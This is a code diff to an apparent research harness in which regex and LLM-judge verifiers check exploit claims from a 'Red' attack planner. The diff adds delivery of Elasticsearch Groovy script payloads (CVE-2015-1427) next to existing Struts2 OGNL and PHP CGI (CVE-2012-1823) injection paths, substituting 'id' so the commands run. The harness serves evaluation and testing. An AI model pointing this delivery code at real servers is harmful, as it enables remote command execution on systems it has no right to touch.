@@ -19,12 +19,6 @@ MODEL = "gemini/gemini-flash-lite-latest"
 
 # -------------------------------------------------------------------------
 # Shared curl-based HEADER dispatch
-#
-# Both C1 and C2 use this for HEADER injection points because:
-#   1. httpx percent-encodes header values, breaking OGNL payloads
-#   2. httpx raises on incomplete chunked reads, which Struts2 produces
-#      when OGNL writes to getOutputStream() and the connection closes
-#      before the response is fully streamed
 # -------------------------------------------------------------------------
 async def _curl_header_post(
     target_url: str,
@@ -77,10 +71,6 @@ def _resolve_cmd_placeholder(payload: str, replacement: str = "id") -> str:
     C1 and C2 do not use arithmetic canaries. If the planner's payload
     contains the {CMD} placeholder (Red now always emits one), substitute
     a plain command so the payload actually executes.
-
-    A real regex/LLM baseline would substitute whatever exploit command
-    the operator requested. We use 'id' because its output (uid=, gid=)
-    is easy for both C1 and C2 to recognise.
     """
     if "{CMD}" in payload:
         return payload.replace("{CMD}", replacement)
@@ -90,6 +80,41 @@ def _resolve_cmd_placeholder(payload: str, replacement: str = "id") -> str:
 def _is_raw_php_body(payload: str) -> bool:
     """CVE-2012-1823 style: the payload IS the request body, not a form field."""
     return payload.strip().startswith("<?php")
+
+
+def _is_bare_groovy(text: str) -> bool:
+    """Elasticsearch CVE-2015-1427 style: a bare Groovy script."""
+    s = text.strip()
+    if s.startswith("{"):
+        return False
+    return ".exec(" in s or "getText()" in s or "getRuntime()" in s
+
+
+def _json_field_request_kwargs(payload: str, parameter_name, headers: dict) -> dict:
+    """
+    Build the kwargs for client.post() when the injection point is JSON_FIELD.
+
+    Three cases:
+      1. Full JSON document -> send raw with Content-Type: application/json.
+      2. Bare Groovy expression (Elasticsearch) -> wrap in script_fields envelope.
+      3. Otherwise -> wrap as a single JSON field.
+    """
+    stripped = payload.strip()
+    hdrs = {**headers, "Content-Type": "application/json"}
+
+    if stripped.startswith("{"):
+        return {"content": stripped.encode("utf-8"), "headers": hdrs}
+
+    if _is_bare_groovy(stripped):
+        envelope = {
+            "size": 1,
+            "script_fields": {
+                "proof": {"lang": "groovy", "script": stripped}
+            },
+        }
+        return {"content": json.dumps(envelope).encode("utf-8"), "headers": hdrs}
+
+    return {"json": {parameter_name or "cmd": payload}, "headers": headers}
 
 
 class _CurlShim:
@@ -150,6 +175,9 @@ class C1RegexVerifier:
                         headers,
                     )
                     r = _CurlShim(status_code=sc, text=body_text)
+                elif claim.injection_point.value == "JSON_FIELD":
+                    kwargs = _json_field_request_kwargs(payload, claim.parameter_name, headers)
+                    r = await client.post(claim.target_url, **kwargs)
                 else:
                     headers[claim.parameter_name or "X-Test"] = payload
                     r = await client.post(claim.target_url, headers=headers)
@@ -233,6 +261,9 @@ class C2LLMJudgeVerifier:
                         headers,
                     )
                     r = _CurlShim(status_code=sc, text=body_text)
+                elif claim.injection_point.value == "JSON_FIELD":
+                    kwargs = _json_field_request_kwargs(payload, claim.parameter_name, headers)
+                    r = await client.post(claim.target_url, **kwargs)
                 else:
                     headers[claim.parameter_name or "X-Test"] = payload
                     r = await client.post(claim.target_url, headers=headers)
